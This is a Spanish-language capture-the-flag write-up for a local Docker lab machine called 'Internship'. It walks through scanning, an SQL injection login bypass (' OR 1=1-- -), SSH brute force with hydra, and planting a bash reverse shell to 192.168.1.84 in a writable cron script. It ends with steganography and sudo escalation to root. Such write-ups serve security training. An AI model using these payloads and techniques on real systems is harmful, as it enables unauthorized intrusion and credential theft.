# 🧠 **Informe de Pentesting – Máquina: Internship** internship

### 💡 **Dificultad:** Fácil


![Despliegue](Imágenes/2025-05-17_19-35.png)

---

## 📝 **Descripción de la máquina**

---

## 🎯 **Objetivo**

---

## ⚙️ **Despliegue de la máquina**

Se descarga el archivo comprimido de la máquina vulnerable y se lanza el contenedor Docker mediante el script incluido:

```bash
unzip internship.zip
sudo bash auto_deploy.sh backend.tar
```

![Despliegue](Imágenes/Capturas.png)

---

## 📡 **Comprobación de conectividad**

Verificamos que la máquina se encuentra activa respondiendo a peticiones ICMP (ping):

```bash
ping -c1 172.17.0.3
```

![Ping](Imágenes/Capturas_1.png)

---

## 🔍 **Escaneo de Puertos**

Realizamos un escaneo completo para detectar todos los puertos abiertos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.3 -oG allPorts.txt
```

**Puertos detectados:**

* `22/tcp`: SSH
* `80/tcp`: HTTP

![Puertos](Imágenes/Capturas_2.png)

Luego, analizamos los servicios y versiones asociados a esos puertos:

```bash
nmap -sCV -p22,80 172.17.0.3 -oN target.txt
```

![Servicios](Imágenes/Capturas_3.png)

---

Entramos a http://172.17.0.3/ y encontramos una pagina de bienbenida.
![Pagina](Imágenes/Capturas_4.png)

Al revisar el codigo fuente se puede ver que hay un domino: gatekeeperhr.com abirmos sudo nano /etc/hosts y agregamos  172.17.0.3 gatekeeperhr.com 
![Dominio](Imágenes/Capturas_6.png)

---

![hosts](Imágenes/Capturas_7.png)

Al agrgar el domino ahora nos permine abrir la pestalla de inicio de sesion
![Registro](Imágenes/Capturas_8.png)

Hacemos una injeccion poniendo en usuario y contraseña: ' OR 1=1-- - esa inyección SQL modifica la consulta original, haciendo que la condición siempre sea verdadera (`1=1`). Omite la verificación de usuario y contraseña, 
permitiendo el acceso sin credenciales válidas.

![Registro](Imágenes/Capturas_9.png)

---

![Registro](Imágenes/Capturas_10.png)
Nota: Estos son posibles usuarios para entrar al servicio de SSH

Se realizo un fuzzin a http://172.17.0.3 pero no dio un resultado explotable asi que se realizo fuzzing al dominio y se encontro:
/about.html           
/contact.html         
/default              
/spam                 
/index.html          
/css                  
/includes             
/js                   
/lab 
![Fuzzing](Imágenes/Capturas_11.png)
Donde varios no permitian su vista y /spam muestra un panatalla negra pero al revisar el codigo fuente se encontro un comentario: Yn pbagenfrñn qr hab qr ybf cnfnagrf rf 'checy3'
Use chatgtp para vaeriguar que tipo de cifraro era y lo que me mostro fue: 
El comentario HTML que has escrito parece estar **cifrado con ROT13**, un cifrado simple que reemplaza cada letra por la que está 13 posiciones después en el alfabeto.

Original (ROT13): Yn pbagenfrñn qr hab qr ybf cnfnagrf rf 'checy3'
Descifrado: La contaraseña de uno de los password es 'purpl3'

### Traducción:
**La contraseña de uno de los password es 'purpl3'**
Nota: Para hecrlo manual si sabes que tipo de cifrado es usar:  echo "Yn pbagenfrna qr ab qr ybs cnfnatrf rf 'checy3'" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

---

Cee un users.txt con los nombre de usuarios de los pasantes ya que en el el codigo cifrado decia que la contraseña es: purpl3 es uno de los pasantes 
Use hydra -L users.txt -p purpl3 ssh://172.17.0.3 -t 4 para encontrar una contraseña donde se encotraron las credenciales: [22][ssh] host: 172.17.0.3   login: pedro   password: purpl3
![Hydra](Imágenes/Capturas_12.png)

Accedí vía SSH como `pedro`. Verifiqué que no tiene privilegios `sudo` (`sudo -l`). Encontré `fl4g.txt` en su home. En `/opt` descubrí `log_cleaner.sh`, propiedad de `valentina` con permisos de escritura. Edité el script con:

```bash
nano log_cleaner.sh
```

Agregué una reverse shell:

```bash
bash -c "bash -i >& /dev/tcp/192.168.1.84/443 0>&1"
```

Listo para esperar conexión en otra terminal con: sudo nc -lvnp 443.
![payload](Imágenes/Capturas_15.png)



Como parte de la escalada de privilegios, accedí como `valentina` y localicé `profile_picture.jpeg`. Lo copié a `/tmp` con:

```bash
cp ~/profile_picture.jpeg /tmp
```

Luego le di permisos globales:

```bash
chmod 777 profile_picture.jpeg
```

Esto permite analizarlo desde otro usuario (maquina atacante) buscando datos ocultos o vectores de explotación.

![Imagen](Imágenes/Capturas_13.png)


Como parte del proceso de escalada de privilegios, desde mi máquina local descargué la imagen `profile_picture.jpeg` con:

```bash
scp pedro@172.17.0.3:/tmp/profile_picture.jpeg .
```

Utilicé esteganografía para extraer datos ocultos:

```bash
steghide extract -sf profile_picture.jpeg
```

Al ingresar la contraseña correcta (no tiene en este caso solo es enter), se extrajo `secret.txt`. Lo leí con:

```bash
cat secret.txt
```

Obtuve la posible clave de valentina: `mag1ck`.

![Contraseña](Imágenes/Capturas_14.png)


---

Tras cambiar a la cuenta `valentina` con:

```bash
su valentina
```

Verifiqué sus permisos con:

```bash
sudo -l
```

Descubrí que puede usar `vim` con `sudo` sin contraseña. Usé:

```bash
sudo su
```
Se obtiene acceso a root

![rott](Imágenes/Capturas_16.png)
